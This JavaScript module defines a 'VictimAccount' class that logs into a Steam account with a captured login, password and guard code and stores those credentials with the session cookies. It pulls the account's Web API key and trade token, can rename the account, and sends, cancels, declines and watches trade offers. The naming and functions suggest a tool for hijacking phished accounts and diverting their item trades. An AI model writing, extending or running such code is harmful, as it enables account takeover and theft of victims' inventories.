const EResult = require('steam-user/enums/EResult');
const SteamUser = require('steam-user');
const SteamAPI = require('./steam-api');
const SteamConverter = require('./steam-converter');

var user = new SteamUser();

class VictimAccount {
    data = { login: "", password: "", guard: "" };
    sessionID = "";
    cookies = [];
    ID64 = "";
    ID32 = "";
    tradeToken = "";
    apiKey = "";

    getInfo() {
        return {
            login_data: this.data,
            session_id: this.sessionID, 
            cookies: this.cookies,
            id_32: this.ID32,
            id_64: this.ID64,
            api_key: this.apiKey,
            trade_token: this.tradeToken
        };
    }

    async refreshInfo() {
        this.ID32 = user.steamID.accountid;
        this.ID64 = SteamConverter.ID32toID64(user.steamID.accountid);

        return new Promise((resolve, reject) => {
            this.getApiKey()
                .then(apiKey => {
                    this.apiKey = apiKey;

                    this.getTradeToken()
                        .then(token => {
                            this.tradeToken = token;
                            resolve(this.getInfo());
                        })
                        .catch(error => reject(error));
                })
                .catch(error => reject(error));
        });
    }

    isLoggedIn = () => Boolean(user.steamID);

    async login(login, password, guard) {
        return new Promise((resolve, reject) => {
            if (this.isLoggedIn()) {
                reject("Already logged on, cannot log on again");
            }

            // for refer THIS object from Callbacks
            var self = this;
    
            try {
                user.logOn({
                    accountName: login,
                    password: password,
                    rememberPassword: true,
                    twoFactorCode: guard
                });
            }
            catch (ex) {
                reject(ex);
            }
    
            user.on("steamGuard", function(domain, callback) {
                reject({ eresult: EResult.AccountLoginDeniedNeedTwoFactor });
            });
    
            user.on("error", function (error) {
                reject(error);
            });
    
            user.on("webSession", function (sessionID, cookies) {
                self.data.login = login;
                self.data.password = password;
                self.data.guard = guard;
                self.sessionID = sessionID;
                self.cookies = cookies;

                self.refreshInfo().finally(() => resolve({
                    sessionID: sessionID,
                    cookies: cookies
                }));
            })
        });
    }

    async logout() {
        return new Promise((resolve, reject) => {
            try {
                user.logOff();
                resolve("Successfully Logged Out");
            }
            catch (ex) {
                reject(ex);
            }
        });
    }

    async updateName(name) {
        return new Promise((resolve, reject) => {
            try {
                user.setPersona(SteamUser.EPersonaState.Online, name);
                resolve(name);
            }
            catch (ex) {
                reject(ex);
            }
        });
    }

    async getProfileInfo() {
        return SteamAPI.getProfileInfo(this.apiKey, this.ID64);
    }

    async makeOffer(partnerID32, partnerID64, partnerItems, myItems, message) {
        return SteamAPI.makeOffer({
            partnerID64: partnerID64,
            partnerID32: partnerID32,
            tradeToken: this.tradeToken,
            cookies: this.cookies,
            sessionID: this.sessionID,
            itemsFromMe: myItems,
            itemsFromThem: partnerItems,
            message: message
        });
    }

    async cancelOffer(offerID) {
        return SteamAPI.cancelOffer(this.apiKey, offerID);
    }

    async declineOffer(offerID) {
        return SteamAPI.declineOffer(this.apiKey, offerID);
    }

    async getActiveOffers() {
        return SteamAPI.getActiveOffers(this.apiKey);
    }

    async waitForNewOffer(ID32toSkip, interval) {
        return new Promise((resolve, reject) => {
            const checkingInterval = setInterval(() => {
                console.log("Watching offers...");

                this.getActiveOffers()
                    .then(offers => {
                        try {
                            const firstSentOffer = offers.trade_offers_sent ? offers.trade_offers_sent[0] : "";
                            const firstReceivedOffer = offers.trade_offers_received ? offers.trade_offers_received[0] : "";

                            if (firstSentOffer.accountid_other == ID32toSkip || firstReceivedOffer.accountid_other == ID32toSkip) {
                                return;
                            }

                            if (firstSentOffer.trade_offer_state == 9) {
                                console.log(`Sent Offer ${firstSentOffer.tradeofferid} found`);
                                clearInterval(checkingInterval);
                                resolve(firstSentOffer);
                            }

                            if (firstReceivedOffer.trade_offer_state == 2) {
                                console.log(`Incoming Offer ${firstReceivedOffer.tradeofferid} found`);
                                clearInterval(checkingInterval);
                                resolve(firstReceivedOffer);
                            }
                        }
                        catch { }
                    })
                    .catch();
            }, interval || 1000);
        });
    }

    async getTradeToken() {
        return new Promise((resolve, reject) => {
            this.getProfileInfo()
                .then(info => {
                    SteamAPI.getTradeToken(info.profileurl, this.sessionID, this.cookies)
                        .then(token => {
                            this.tradeToken = token;
                            resolve(token);
                        })
                        .catch(error => reject(error));
                })
                .catch(error => reject(error));
        });
    }

    async getApiKey(domain) {
        return new Promise((resolve, reject) => {
            SteamAPI.retrieveAPIKey(domain, this.sessionID, this.cookies)
                    .then(key => {
                        this.apiKey = key;
                        resolve(key);
                    })
                    .catch(error => reject(error));
        });
    }
}

module.exports = VictimAccount;